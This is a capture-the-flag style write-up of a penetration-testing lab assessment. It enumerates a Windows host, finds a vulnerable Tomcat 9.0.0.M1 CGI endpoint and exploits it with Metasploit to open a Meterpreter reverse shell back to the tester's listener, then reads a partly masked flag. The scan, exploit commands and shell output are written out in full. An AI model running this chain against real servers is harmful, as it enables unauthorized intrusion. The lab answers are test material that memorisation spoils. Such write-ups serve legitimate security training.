# Attacking Common Applications - Skills Assessment I

## Objective

During a penetration test against the company Inlanefreight, you have performed extensive enumeration and 
found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your 
ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, 
obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

### Questions

1.  What vulnerable application is running?
2.  What port is this application running on?
3.  What version of the application is in use?
4.  Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.

## Start 

### Enumeration 

```
nmap -sVC -p- --open 10.129.201.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 12:41 CDT
Nmap scan report for 10.129.201.89
Host is up (0.0077s latency).
Not shown: 61168 closed tcp ports (reset), 4348 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_09-01-21  08:07AM       <DIR>          website_backup
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Freight Logistics, Inc
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-10T17:43:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=APPS-SKILLS1
| Not valid before: 2025-10-09T17:37:37
|_Not valid after:  2026-04-10T17:37:37
| rdp-ntlm-info: 
|   Target_Name: APPS-SKILLS1
|   NetBIOS_Domain_Name: APPS-SKILLS1
|   NetBIOS_Computer_Name: APPS-SKILLS1
|   DNS_Domain_Name: APPS-SKILLS1
|   DNS_Computer_Name: APPS-SKILLS1
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-10T17:42:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Jetty 9.4.42.v20210604
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.42.v20210604)
8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1   <------------------------ HERE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-10T17:43:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.33 seconds
```
`Application` : Tomcat

`Port` : 8080 

`Version` : 9.0.0.M1

### Exploit 

https://github.com/advisories/GHSA-8vmx-qmch-mpqg

```
$ gobuster dir -u http://10.129.201.89:8080/cgi/ -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
/Cmd.bat              (Status: 200) [Size: 0]
/cmd.bat              (Status: 200) [Size: 0]
```

```
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
```

```
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set RHOSTS 10.129.201.89
RHOSTS => 10.129.201.89
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set TARGETURI /cgi/cmd.bat
TARGETURI => /cgi/cmd.bat
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set FORCEEXPLOIT true
FORCEEXPLOIT => true
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> check
[*] 10.129.201.89:8080 - The target is not exploitable.
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> exploit
[*] Started reverse TCP handler on 10.10.15.146:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (177734 bytes) to 10.129.201.89
[*] Command Stager progress - 100.00% done (100668/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.15.146:4444 -> 10.129.201.89:49689) at 2025-10-10 12:51:46 -0500
```

```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:/Users/Administrator/Desktop/flag.txt
f55763d31a8f63ec93XXXXXXXXXXXX(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

`flag` : f55763d31a8f63ec93XXXXXXXXXXXX





































